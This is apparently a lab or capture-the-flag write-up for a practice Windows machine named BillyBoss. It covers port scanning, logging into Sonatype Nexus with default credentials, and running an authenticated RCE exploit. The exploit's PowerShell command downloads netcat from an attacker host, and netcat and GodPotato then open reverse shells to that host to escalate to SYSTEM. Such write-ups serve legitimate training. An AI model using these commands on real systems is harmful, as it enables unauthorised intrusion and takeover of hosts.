# BillyBoss

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.175.61 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 20:35 +08
Nmap scan report for 192.168.175.61
Host is up (0.17s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8081/tcp  open  blackice-icecap
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

To avoid making this long:

* FTP was not interesting because anonymous access isn't allowed and guessing credentials is pointless.
* Port 80 had some application that wasn't working properly.
* SMB did not accept null credentials and had nothing there.
* The rest of the ports were pretty useless.

### Default Creds -> Nexus RCE

Port 8081 had a Nexus Repository Manager that was running:

<figure><img src="../../../.gitbook/assets/image (2141).png" alt=""><figcaption></figcaption></figure>

To exploit this, we first need to guess the credentials to login. `nexus:nexus` works for this one. Then, we need to grab the correct exploit:

```
$ searchsploit sonatype     
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticat | java/webapps/49385.py
----------------------------------------------------------- ---------------------------------
```

Edit the exploit accordingly:

```
URL='http://192.168.175.61:8081'
CMD='cmd.exe /c powershell -c wget 192.168.45.164/nc64.exe -Outfile C:/Windows/Tasks/nc.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

Then, we can

Then, we can execute the script once to download `nc.exe` onto the machine, and another to execute `nc.exe` to get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (2904).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SeImpersonatePrivilege -> Admin Shell

The user has `SeImpersonatePrivilege` enabled:

```
C:\Windows\Tasks>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

However, `PrintSpoofer.exe` wasn't working normally, so we probably need to use another method. Instead, we can use `GodPotato.exe` to do this:

{% embed url="https://github.com/BeichenDream/GodPotato/releases" %}

```
.\potato.exe -cmd "C:\Windows\Tasks\nc.exe 192.168.45.164 4444 -e cmd.exe"
```

<figure><img src="../../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>

For some reason, this user was unable to run `whoami`, so I just captured the flag instead:

![](<../../../.gitbook/assets/image (3198).png>)
